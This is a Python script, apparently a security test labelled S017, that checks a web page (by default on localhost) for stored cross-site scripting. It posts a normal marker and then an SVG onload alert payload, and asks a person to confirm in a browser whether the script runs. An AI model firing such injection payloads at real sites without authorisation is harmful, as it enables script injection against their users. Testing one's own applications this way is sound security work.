import os
import urllib.parse
import urllib.request

TARGET_URL = os.environ.get("S017_URL", "http://127.0.0.1:4280/")
NORMAL_INPUT = "S017_NORMAL_MARKER"
TEST_INPUT = "<svg onload=alert('S017_XSS')></svg>"


def post_body(url: str, body: str):
    data = urllib.parse.urlencode({"body": body}).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return resp.status, resp.read().decode("utf-8", "replace")


def get_page(url: str):
    with urllib.request.urlopen(url, timeout=10) as resp:
        return resp.status, resp.read().decode("utf-8", "replace")


def main():
    print("目标 URL:", TARGET_URL)

    print("\n[1] 写入普通输入:", NORMAL_INPUT)
    status, _ = post_body(TARGET_URL, NORMAL_INPUT)
    print("POST 普通输入状态:", status)

    status, html = get_page(TARGET_URL)
    print("GET 页面状态:", status)
    print("响应含普通标记:", NORMAL_INPUT in html)
    print("响应含测试 payload 字符串:", TEST_INPUT in html)

    print("\n[2] 写入测试输入:", TEST_INPUT)
    status, _ = post_body(TARGET_URL, TEST_INPUT)
    print("POST 测试输入状态:", status)

    status, html = get_page(TARGET_URL)
    print("GET 页面状态:", status)
    print("响应含测试 payload 字符串:", TEST_INPUT in html)

    print("\n[3] 需要人工在浏览器确认：")
    print("请打开:", TARGET_URL)
    print("普通标记应只作为文本显示；测试输入若被浏览器执行，应弹出提示框 S017_XSS。")
    print("注意：HTTP 响应中出现 payload 字符串不等同于 JavaScript 已执行。")


if __name__ == "__main__":
    main()
